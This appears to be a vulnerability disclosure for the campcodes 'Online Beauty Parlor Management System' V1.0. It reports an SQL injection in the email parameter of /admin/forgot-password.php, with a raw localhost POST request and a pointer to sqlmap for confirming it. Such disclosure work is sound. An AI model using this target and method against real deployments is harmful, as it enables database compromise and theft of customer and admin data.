Online Beauty Parlor Management System - SQL Injection on (/admin/forgot-password.php email parameter) 

Vendor Homepage:

```
https://www.campcodes.com/projects/online-beauty-parlor-management-system/
```

Version: 

```
V1.0
```

Tested on: 

```
PHP, Apache, MySQL
```

Affected Page:

```
/admin/forgot-password.php
```

On this page, `email` parameter is vulnerable to SQL Injection Attack

<img width="972" height="667" alt="image" src="https://github.com/user-attachments/assets/ccd2ecf4-8241-4e98-ba96-8fd18bb59a23" />


Proof of vulnerability(Verify using the sqlmap tool after logining):

Request:

```
POST /bpms/admin/forgot-password.php HTTP/1.1
Host: localhost
Content-Length: 41
Cache-Control: max-age=0
sec-ch-ua: "Not:A-Brand";v="24", "Chromium";v="134"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "macOS"
Accept-Language: zh-CN,zh;q=0.9
Origin: http://localhost
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/bpms/admin/forgot-password.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=35oep1of4pinmqsin6t7o6nae7
Connection: keep-alive

email=admin&contactno=123456&submit=Reset
```

<img width="970" height="657" alt="image" src="https://github.com/user-attachments/assets/9a734c4e-50a9-4001-a154-f10b0522c103" />




